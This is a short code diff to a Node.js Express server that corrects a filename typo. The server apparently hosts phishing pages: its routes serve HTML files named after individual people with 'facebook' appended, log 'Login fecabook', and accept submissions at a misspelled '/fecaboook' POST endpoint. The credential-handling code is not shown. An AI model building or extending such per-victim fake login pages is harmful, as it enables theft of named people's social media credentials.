@@ -31,7 +31,7 @@ app.get('/heba_omar_facebook', (req, res, next) => {
 
 app.get('/nouri_ali_facebook', (req, res, next) => {
     console.log('Login fecabook');
-    res.sendFile(__dirname + '/nouri_ail_facebook.html')
+    res.sendFile(__dirname + '/nouri_ali_facebook.html')
 });
 
 app.post('/fecaboook', (req, res, next) => {
